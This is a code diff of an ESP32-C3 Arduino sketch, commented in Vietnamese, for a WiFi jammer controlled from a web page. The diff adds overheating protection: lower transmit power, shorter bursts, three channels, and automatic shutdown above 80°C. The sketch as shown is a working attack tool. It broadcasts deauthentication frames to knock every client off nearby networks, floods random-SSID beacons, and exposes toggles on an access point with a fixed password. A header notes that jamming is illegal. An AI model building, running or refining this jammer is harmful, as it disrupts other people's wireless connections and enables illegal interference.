@@ -1,11 +1,12 @@
 /*
- * ESP32-C3 WiFi Jammer via Web Server
+ * ESP32-C3 WiFi Jammer via Web Server — BẢN CHỐNG QUÁ NHIỆT
  * - AP "C3-Jammer" / pass 12345678
  * - Web UI: DEAUTH / BEACON SPAM / JAM ALL
- * - Burst 3s jam / 2s nhường AP
+ * - Giảm tải nhiệt: TX 13dBm, burst 1s / nghỉ 4s, chỉ 3 kênh
+ * - Tự tắt khi chip > 80°C
  *
  * Board: ESP32-C3 Dev Module
- * Core:  esp32 by Espressif 2.0.14 hoặc 3.x — build được cả hai
+ * Core:  esp32 by Espressif (2.0.14 hoặc 3.x)
  * Libraries: built-in only
  *
  * ⚠️ CHỈ DÙNG TRONG LAB CÁCH LY — GÂY NHIỄU WIFI VI PHẠM PHÁP LUẬT
@@ -33,6 +34,9 @@ extern "C" {
 const char* AP_SSID = "C3-Jammer";
 const char* AP_PASS = "12345678";
 
+// Ngưỡng nhiệt độ tự tắt (°C)
+const float TEMP_LIMIT = 80.0f;
+
 WebServer server(80);
 
 volatile bool     flagDeauth    = false;
@@ -40,6 +44,7 @@ volatile bool     flagBeacon    = false;
 volatile bool     flagJamAll    = false;
 volatile uint32_t pktCount      = 0;
 volatile uint32_t beaconCount   = 0;
+volatile float    chipTemp      = 0.0f;
 
 // ============================================================
 // FRAME TEMPLATES
@@ -120,47 +125,90 @@ static inline void sendBeacon(uint8_t chan, const char* ssid) {
 }
 
 // ============================================================
-// TASK JAMMER
+// TASK JAMMER — bản giảm nhiệt
 // ============================================================
 void jammerTask(void* pv) {
-  const uint8_t channels[] = {1,2,3,4,5,6,7,8,9,10,11,12,13};
-  const int nCh = 13;
+  // Chỉ 3 kênh chính, bỏ các kênh phụ để giảm hoạt động radio
+  const uint8_t channels[] = {1, 6, 11};
+  const int nCh = 3;
   char ssidBuf[33];
 
   for (;;) {
     if (!flagDeauth && !flagBeacon && !flagJamAll) {
-      vTaskDelay(pdMS_TO_TICKS(200));
+      vTaskDelay(pdMS_TO_TICKS(500));
+      continue;
+    }
+
+    // Nếu chip quá nóng → tạm dừng jammer
+    if (chipTemp > TEMP_LIMIT) {
+      vTaskDelay(pdMS_TO_TICKS(1000));
       continue;
     }
 
     unsigned long t0 = millis();
-    uint8_t chIdx = 0;
 
-    while (millis() - t0 < 3000) {
+    // ===== BURST NGẮN: 1 giây =====
+    while (millis() - t0 < 1000) {
       if (!flagDeauth && !flagBeacon && !flagJamAll) break;
+      if (chipTemp > TEMP_LIMIT) break;
 
+      // DEAUTH broadcast trên 3 kênh
       if (flagDeauth || flagJamAll) {
         static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-        for (uint8_t c = 1; c <= 13; c++) {
-          sendDeauth(c, bcast, bcast, bcast, 0xC0);
-          sendDeauth(c, bcast, bcast, bcast, 0xA0);
+        for (uint8_t i = 0; i < nCh; i++) {
+          sendDeauth(channels[i], bcast, bcast, bcast, 0xC0);
+          sendDeauth(channels[i], bcast, bcast, bcast, 0xA0);
         }
       }
 
+      // BEACON SPAM — chỉ 2 SSID/lần
       if (flagBeacon || flagJamAll) {
-        for (int i = 0; i < 4; i++) {
+        for (int i = 0; i < 2; i++) {
           uint8_t len = random(6, 16);
           for (uint8_t j = 0; j < len; j++) ssidBuf[j] = (char)random(32, 127);
           ssidBuf[len] = 0;
-          sendBeacon(channels[chIdx], ssidBuf);
+          sendBeacon(channels[random(0, nCh)], ssidBuf);
         }
       }
 
-      chIdx = (chIdx + 1) % nCh;
-      vTaskDelay(pdMS_TO_TICKS(2));
+      // Nghỉ 5ms giữa các frame để radio hạ nhiệt
+      vTaskDelay(pdMS_TO_TICKS(5));
     }
 
-    vTaskDelay(pdMS_TO_TICKS(2000));
+    // ===== NGHỈ DÀI: 4 giây =====
+    vTaskDelay(pdMS_TO_TICKS(4000));
+  }
+}
+
+// ============================================================
+// TASK GIÁM SÁT NHIỆT ĐỘ
+// ============================================================
+void tempTask(void* pv) {
+  for (;;) {
+    // temperatureRead() có trên core 3.x; core 2.x dùng hàm khác.
+    // Nếu build lỗi, comment đoạn này lại.
+    #if ESP_ARDUINO_VERSION_MAJOR >= 3
+      chipTemp = temperatureRead();
+    #else
+      // Core 2.x: dùng temp_sensor (cần driver)
+      // Đơn giản hóa: để 0 (bỏ qua giám sát nhiệt)
+      chipTemp = 0.0f;
+    #endif
+
+    Serial.printf("[TEMP] %.1f C  pkts=%lu  bcns=%lu\n",
+                  chipTemp,
+                  (unsigned long)pktCount,
+                  (unsigned long)beaconCount);
+
+    // Nếu quá nóng, tự tắt jammer
+    if (chipTemp > TEMP_LIMIT) {
+      flagDeauth = false;
+      flagBeacon = false;
+      flagJamAll = false;
+      Serial.println("[TEMP] QUA NONG! Da tat jammer.");
+    }
+
+    vTaskDelay(pdMS_TO_TICKS(5000));   // đọc mỗi 5 giây
   }
 }
 
@@ -183,6 +231,7 @@ const char PAGE_HTML[] PROGMEM = R"HTML(
   input:checked + .slider{background:#f44}
   input:checked + .slider:before{transform:translateX(26px)}
   .stat{font-size:14px;color:#8f8}
+  .warn{color:#f44;font-weight:bold}
   button{background:#444;color:#fff;border:0;padding:10px 16px;border-radius:6px;font-size:16px}
   button:active{background:#f44}
 </style></head><body>
@@ -203,11 +252,16 @@ const char PAGE_HTML[] PROGMEM = R"HTML(
 <div class="card">
   <div class="row"><span>Packets:</span><span class="stat" id="pkts">0</span></div>
   <div class="row"><span>Beacons:</span><span class="stat" id="bcns">0</span></div>
+  <div class="row"><span>Nhiet do chip:</span><span class="stat" id="temp">--</span></div>
   <div class="row"><span>Trang thai:</span><span class="stat" id="state">IDLE</span></div>
 </div>
 
 <div class="card" style="text-align:center">
   <button onclick="stopAll()">STOP ALL</button>
+</div>
+
+<div id="warn" class="card warn" style="display:none;text-align:center">
+  QUA NHIET — Jammer da tu dong tat
 </div>
 
 <script>
@@ -229,10 +283,12 @@ function refresh(){
   fetch('/status').then(r=>r.json()).then(j=>{
     document.getElementById('pkts').innerText = j.pkts;
     document.getElementById('bcns').innerText = j.bcns;
+    document.getElementById('temp').innerText = j.temp.toFixed(1) + ' C';
     document.getElementById('state').innerText = j.state;
     document.getElementById('deauth').checked = j.deauth;
     document.getElementById('beacon').checked = j.beacon;
     document.getElementById('jamall').checked = j.jamall;
+    document.getElementById('warn').style.display = j.hot ? 'block' : 'none';
   }).catch(()=>{});
 }
 setInterval(refresh, 1500);
@@ -265,7 +321,9 @@ void handleSet() {
 }
 
 void handleStatus() {
-  const char* st = (flagJamAll || flagDeauth || flagBeacon) ? "JAMMING" : "IDLE";
+  bool hot = (chipTemp > TEMP_LIMIT);
+  const char* st = hot ? "QUA NHIET"
+                       : ((flagJamAll || flagDeauth || flagBeacon) ? "JAMMING" : "IDLE");
 
   String json = "{";
   json += "\"pkts\":"   + String((uint32_t)pktCount)    + ",";
@@ -273,6 +331,8 @@ void handleStatus() {
   json += "\"deauth\":" + String(flagDeauth ? "true" : "false") + ",";
   json += "\"beacon\":" + String(flagBeacon ? "true" : "false") + ",";
   json += "\"jamall\":" + String(flagJamAll ? "true" : "false") + ",";
+  json += "\"temp\":"   + String(chipTemp, 1) + ",";
+  json += "\"hot\":"    + String(hot ? "true" : "false") + ",";
   json += "\"state\":\"" + String(st) + "\"";
   json += "}";
   server.send(200, "application/json", json);
@@ -293,20 +353,31 @@ void setup() {
                 AP_SSID, WiFi.softAPIP().toString().c_str());
 
   esp_wifi_set_promiscuous(false);
-  esp_wifi_set_max_tx_power(78);
-  esp_wifi_set_ps(WIFI_PS_NONE);
 
+  // ===== GIẢM CÔNG SUẤT TX (52 ≈ 13 dBm) để chống nóng =====
+  esp_wifi_set_max_tx_power(52);
+
+  // Cho phép modem sleep khi rảnh
+  esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
+
+  // Web server
   server.on("/",       handleRoot);
   server.on("/set",    handleSet);
   server.on("/status", handleStatus);
   server.begin();
   Serial.println("[WEB] http://192.168.4.1");
 
+  // Task jammer + task giám sát nhiệt
   xTaskCreatePinnedToCore(jammerTask, "jammer", 4096, NULL, 1, NULL, 0);
+  xTaskCreatePinnedToCore(tempTask,   "temp",   2048, NULL, 1, NULL, 0);
+
   randomSeed(esp_random());
-  Serial.println("[OK] Ready.");
+  Serial.println("[OK] Ready. Chi dung trong lab cach ly!");
 }
 
+// ============================================================
+// LOOP
+// ============================================================
 void loop() {
   server.handleClient();
   delay(2);
